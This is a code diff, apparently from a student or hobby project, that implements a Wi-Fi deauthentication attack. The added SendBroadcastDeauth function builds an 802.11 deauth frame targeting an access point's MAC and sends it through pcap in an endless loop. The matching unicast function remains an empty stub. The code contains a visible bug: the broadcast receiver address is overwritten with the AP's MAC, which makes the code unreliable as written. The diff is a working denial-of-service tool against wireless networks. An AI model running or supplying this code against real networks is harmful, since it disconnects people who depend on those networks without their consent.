@@ -10,15 +10,29 @@ void Usage(char* arg) {
 }
 
 void SendBroadcastDeauth(pcap_t* handle, Mac apMac) {
-	// make packet	
+	int res;
+
+	DeauthAttackPacket pkt;
+	
+	memset(&pkt, 0x00, sizeof(DeauthAttackPacket));
+	pkt.rtab[2] = 0x08;
+	pkt.type = DEAUTH_TYPE;
+	pkt.man[0] = 0x07;
+	memset(&pkt.rcv, 0xff, sizeof(Mac));
+	memcpy(&pkt.rcv, (uint8_t*)apMac, sizeof(Mac));
+	memcpy(&pkt.bssid, (uint8_t*)apMac, sizeof(Mac));
 	while (true) {
-		// send packet
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(DeauthAttackPacket));
+		if (0 != res) printf("Fail to send packet | res=%d | error=%s\n", res, pcap_geterr(handle));
+		else printf("pkt sent!\n");
+
+		usleep(999);
 	}
 }
 
 void SendUnicastDeauth(pcap_t* handle, Mac apMac, Mac stationMac) {
         // make packet
-        while (true) {
+	while (true) {
                 // send packet
         }
 }
